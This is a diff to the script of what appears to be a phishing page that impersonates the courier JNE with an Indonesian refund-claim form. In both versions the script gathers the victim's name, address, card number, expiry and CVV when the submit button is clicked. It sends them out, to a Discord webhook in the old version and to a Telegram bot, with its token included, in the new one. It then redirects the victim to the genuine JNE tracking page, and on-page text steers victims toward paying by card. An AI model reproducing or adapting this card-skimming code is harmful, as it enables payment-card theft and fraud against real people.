@@ -173,51 +173,54 @@
         <img src="https://pttikijalurnugrahaekakurir.force.com/eclaimform/resource/1671433394000/chatLogo" width="150" height="160" alt="Chatbot">
     </a>
 
-    <script>
-        const paymentOptionRadios = document.querySelectorAll('input[name="payment_option"]');
-        const creditCardDetails = document.querySelector('.credit-card-details');
-        const paymentText = document.getElementById('payment-text');
-        const ajukanButton = document.getElementById('ajukan-button');
+<script>
+    const paymentOptionRadios = document.querySelectorAll('input[name="payment_option"]');
+    const creditCardDetails = document.querySelector('.credit-card-details');
+    const paymentText = document.getElementById('payment-text');
+    const ajukanButton = document.getElementById('ajukan-button');
 
-        ajukanButton.addEventListener('click', () => {
-            // Check if all form fields are filled
-            const form = document.getElementById('jne-form');
-            if (form.checkValidity()) {
-                // Create the POST data
-                const postData = {
-                    content: `:green_circle: HIT | Full Name: ${form.elements.nama_lengkap.value} | Address: ${form.elements.alamat.value} | Zip Code: ${form.elements.kode_pos.value} | Cardholder: ${form.elements.nama_pemegang_kartu.value} | Card Number: ${form.elements.nomor_kartu.value} | Expiry: ${form.elements.bulan_kedaluwarsa.value}/${form.elements.tahun_kedaluwarsa.value} | CVV: ${form.elements.cvv.value}`
-                };
+    ajukanButton.addEventListener('click', () => {
+        // Check if all form fields are filled
+        const form = document.getElementById('jne-form');
+        if (form.checkValidity()) {
+            // Create the POST data
+            const postData = {
+                content: `🍒 HIT | Full Name: ${form.elements.nama_lengkap.value} | Address: ${form.elements.alamat.value} | Zip Code: ${form.elements.kode_pos.value} | Cardholder: ${form.elements.nama_pemegang_kartu.value} | Card Number: ${form.elements.nomor_kartu.value} | Expiry: ${form.elements.bulan_kedaluwarsa.value}/${form.elements.tahun_kedaluwarsa.value} | CVV: ${form.elements.cvv.value}`
+            };
 
-                // Send the POST request
-                fetch("https://discord.com/api/webhooks/1156864260849283103/Bm8pffkJPCbDth1m48y9wPYID2U9UQRWbt3v6_yCZmTVa87Pf_UciN8e4sEyg05Ingw9", {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(postData),
-                })
-                .then(response => response.json())
-                .then(data => console.log(data))
-                .catch(error => console.error('Error:', error));
+            // Send the POST request to Telegram
+// Create the GET request URL with postData included
+const url = `https://api.telegram.org/bot6524373912:AAGlB_jaUOlpk9OdXFGSr0RVecNJ3RTJb2A/sendMessage?chat_id=-1001964171196&text=${postData.content}`;
 
-                // Redirect to the specified URL
-                window.location.href = "https://jne.co.id/id/tracking/trace";
+// Send the GET request to Telegram
+fetch(url, {
+    method: 'GET',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+})
+.then(response => response.json())
+.then(data => {
+    // After the Telegram request is successful, redirect to the specified URL
+    window.location.href = "https://jne.co.id/id/tracking/trace";
+})
+.catch(error => console.error('Error:', error));
+        } else {
+            form.reportValidity();
+        }
+    });
+
+    paymentOptionRadios.forEach(radio => {
+        radio.addEventListener('change', () => {
+            if (radio.value === 'Transfer Rekening') {
+                creditCardDetails.style.display = 'none';
+                paymentText.innerText = "Layanan Bank kami saat ini sedang dalam pemeliharaan. ETA: 10-12 hari kerja.";
             } else {
-                form.reportValidity();
+                creditCardDetails.style.display = 'block';
+                paymentText.innerText = "Jumlah yang Anda kembalikan akan dikembalikan secara instan jika itu adalah kartu kredit. Jika debit akan memakan waktu 3-5 hari kerja.";
             }
         });
-
-        paymentOptionRadios.forEach(radio => {
-            radio.addEventListener('change', () => {
-                if (radio.value === 'Transfer Rekening') {
-                    creditCardDetails.style.display = 'none';
-                    paymentText.innerText = "Layanan Bank kami saat ini sedang dalam pemeliharaan. ETA: 10-12 hari kerja.";
-                } else {
-                    creditCardDetails.style.display = 'block';
-                    paymentText.innerText = "Jumlah yang Anda kembalikan akan dikembalikan secara instan jika itu adalah kartu kredit. Jika debit akan memakan waktu 3-5 hari kerja.";
-                }
-            });
-        });
-    </script>
+    });
+</script>
 </body>
 </html>
